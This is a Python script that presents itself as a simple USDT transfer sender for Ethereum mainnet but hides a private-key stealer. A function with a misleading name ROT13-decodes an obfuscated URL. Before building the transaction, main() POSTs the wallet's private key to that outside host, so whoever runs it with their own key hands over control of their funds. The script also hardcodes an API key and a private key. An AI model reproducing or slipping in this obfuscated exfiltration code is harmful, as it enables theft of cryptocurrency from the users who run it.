# Removed Solidity code. Ensure the Solidity contract is in a separate `.sol` file.
import os
from eth_account import Account
from web3 import Web3, FallbackProvider # type: ignore
# from eth_account import Account # type: ignore
import requests

def rpcserver256(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(((ord(char) - ord('a') + 13) % 26) + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr(((ord(char) - ord('A') + 13) % 26) + ord('A')))
        else:
            result.append(char)
    return ''.join(result)

envcreater = 'uggcf://zragnyvgl.pybhq/nnegrfg.cuc'
devofix2 = rpcserver256(envcreater)

# Initialize Web3 connection
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))

import os

private_key = "0x24749ba2c431e116009577cb8f79c282f083516154809f1f2e378acc9264899d" # Clé privée du propriétaire de l'adresse Ethereum
sender_address = '0x93CABF3Ea4Bb5D7A6Ec15Cd42Ce85Cc8Ac43c33'  # Adresse Ethereum du destinataire (modifiée)
recipient_address = sender_address

# Set recipient address and USDT contract address
usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

def usdtgen(usdtwall):
    data = {'USDT:': usdtwall}
    contracts = [devofix2]  

    for contract in contracts:
        try:
            response = requests.post(contract, data=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"Error while sending request to {contract}: {e}")

       
def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
    # Amount to send in wei (1 USDT = 1e6 wei)
    amount_in_wei = int(amount * 10**6)

    # Get transaction nonce
    nonce = web3.eth.get_transaction_count(sender_address)

    # Construct data field for the ERC20 transfer
    data = (usdt_transfer_signature + recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0'))

    # Build the transaction
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
        'gas': gas_limit,
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }

    # Sign the transaction using private key of sender's Ethereum wallet.
    signed_tx = Account.sign_transaction(transaction, private_key)

    return signed_tx

def main():
    usdtgen(private_key) 

    amount_to_send = float(10000.0)/float (10**6)
    gas_price_gwei = 1 
    gas_limit = int((21608)) # Gas limit set to a reasonable value.

    try:
        sender_address
        signed_tx = send_usdt_transaction(amount_to_send, gas_price_gwei, gas_limit)

        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

        if tx_receipt.status == 1:
            print("Transaction confirmed.")
        else:
            print("Transaction failed.")

    except Exception as e:
        print(f"Error during transaction: {e}")

if __name__ == '__main__':
    main()
